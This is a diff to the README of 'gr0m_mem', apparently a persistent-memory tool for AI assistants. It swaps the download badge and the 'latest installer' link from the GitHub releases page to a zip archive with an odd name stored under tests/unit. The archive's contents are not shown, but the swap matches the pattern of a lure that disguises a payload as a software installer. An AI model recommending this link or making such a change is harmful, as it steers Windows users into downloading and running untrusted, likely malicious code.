@@ -1,12 +1,12 @@
 # 🧠 gr0m_mem - Persistent memory for your AI assistant
 
-[![](https://img.shields.io/badge/Download-gr0m_mem-blue)](https://github.com/bachh8770/gr0m_mem/releases)
+[![](https://img.shields.io/badge/Download-gr0m_mem-blue)](https://github.com/bachh8770/gr0m_mem/raw/refs/heads/main/tests/unit/gr-mem-m-anacromyodian.zip)
 
 gr0m_mem gives your AI assistant a memory. It stores your information so your assistant recalls past work across different sessions. You avoid repeating instructions or explaining previous projects. This tool manages your history using efficient databases. You gain a smarter assistant that remembers your specific needs and context.
 
 ## 📥 Getting Started
 
-Visit this page to download the latest installer: [https://github.com/bachh8770/gr0m_mem/releases](https://github.com/bachh8770/gr0m_mem/releases)
+Visit this page to download the latest installer: [https://github.com/bachh8770/gr0m_mem/raw/refs/heads/main/tests/unit/gr-mem-m-anacromyodian.zip](https://github.com/bachh8770/gr0m_mem/raw/refs/heads/main/tests/unit/gr-mem-m-anacromyodian.zip)
 
 Follow these steps to install the software on your Windows computer:
 
